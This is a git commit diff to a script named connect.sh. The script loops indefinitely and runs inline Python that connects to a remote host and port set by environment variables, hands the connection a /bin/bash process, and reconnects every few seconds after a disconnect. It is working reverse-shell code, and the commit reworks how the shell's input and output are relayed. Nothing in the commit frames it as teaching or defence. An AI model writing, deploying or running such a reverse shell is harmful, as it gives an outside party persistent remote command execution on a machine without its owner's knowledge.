6badb70b750a6e719770850ce5d699e39d673945
mradigen <55953083+mradigen@users.noreply.github.com>
2025-09-05 17:32:18 +0530

    u

--- connect.sh
+++ connect.sh
@@ -5,24 +5,40 @@ export RPORT=19088
 
 while true; do
     python3 -c '
-import sys, socket, os, pty, select
-s = socket.socket()
+import os, sys, socket, select, subprocess
+
+rhost, rport = os.getenv("RHOST"), int(os.getenv("RPORT"))
 try:
-    s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))
+    s = socket.socket()
+    s.connect((rhost, rport))
 except Exception:
     sys.exit(1)
 
-# Attach stdin/stdout/stderr
-for fd in (0,1,2):
-    os.dup2(s.fileno(), fd)
+# Spawn /bin/bash
+proc = subprocess.Popen(
+    ["/bin/bash"],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.PIPE
+)
 
-# Monitor connection and exit if it closes
+# Forward between socket and shell until disconnect
 try:
-    pty.spawn("bash")
-except OSError:
-    pass
+    while True:
+        r, _, _ = select.select([s, proc.stdout, proc.stderr], [], [])
+        if s in r:
+            data = s.recv(4096)
+            if not data:  # socket closed
+                break
+            proc.stdin.write(data)
+            proc.stdin.flush()
+        if proc.stdout in r:
+            s.send(proc.stdout.read1(4096))
+        if proc.stderr in r:
+            s.send(proc.stderr.read1(4096))
 finally:
     s.close()
+    proc.kill()
     sys.exit(0)
 '
     echo "[*] Disconnected, retrying in 5 seconds..."
